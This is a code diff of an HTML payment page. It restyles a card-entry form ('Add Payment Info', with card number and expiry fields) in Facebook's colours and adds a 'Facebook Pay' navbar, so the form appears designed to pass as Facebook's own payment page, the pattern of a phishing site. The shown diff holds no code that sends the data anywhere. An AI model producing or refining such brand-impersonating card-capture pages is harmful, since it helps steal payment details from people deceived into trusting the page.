@@ -19,21 +19,29 @@
             margin: 0;
             padding: 0;
             text-align: center;
-            background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        .navbar {
+            background: #1877f2;
+            padding: 10px;
             color: white;
+            font-size: 24px;
+            font-weight: bold;
         }
         .container {
-            max-width: 500px;
+            max-width: 400px;
             margin: 50px auto;
             padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
         }
         input, button {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
-            border: none;
+            border: 1px solid #ddd;
             border-radius: 5px;
         }
         input {
@@ -41,14 +49,14 @@
             color: black;
         }
         button {
-            background: orange;
-            color: blue;
+            background: #1877f2;
+            color: white;
             font-weight: bold;
             cursor: pointer;
+            border: none;
         }
         button:hover {
-            background: blue;
-            color: orange;
+            background: #165ecb;
         }
     </style>
 </head>
@@ -58,8 +66,9 @@
     height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <!-- End Google Tag Manager (noscript) -->
     
+    <div class="navbar">Facebook Pay</div>
     <div class="container">
-        <h1>Add Payment Info</h1>
+        <h2>Add Payment Info</h2>
         <form id="paymentForm">
             <input type="text" id="cardNumber" placeholder="Card Number" required><br>
             <input type="text" id="expiryDate" placeholder="Expiry Date (MM/YY)" required><br>
